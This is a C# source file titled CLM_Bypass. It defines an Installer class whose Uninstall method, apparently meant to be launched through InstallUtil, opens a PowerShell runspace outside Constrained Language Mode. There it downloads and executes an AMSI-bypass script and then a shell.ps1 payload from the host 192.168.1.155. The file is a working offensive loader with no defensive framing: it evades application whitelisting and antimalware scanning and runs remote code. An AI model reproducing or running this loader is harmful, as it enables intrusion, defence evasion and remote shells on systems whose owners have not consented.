using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Configuration.Install;

namespace CLM_Bypass
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("This is the main method");
        }
    }

    [System.ComponentModel.RunInstaller(true)]
    public class Loader : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            string payload = "Invoke-Expression (Invoke-WebRequest -Uri 'http://192.168.1.155/amsi.txt' -UseBasicParsing | Select-Object -ExpandProperty Content); " +
                             "$scriptContent = [System.Text.Encoding]::UTF8.GetString((Invoke-WebRequest -Uri 'http://192.168.1.155/shell.ps1' -UseBasicParsing).Content); " +
                             "Invoke-Expression $scriptContent";

            Runspace rs = RunspaceFactory.CreateRunspace();
            rs.Open();
            PowerShell ps = PowerShell.Create();
            ps.Runspace = rs;
            ps.AddScript(payload);
            ps.Invoke();
            rs.Close();
        }
    }
}

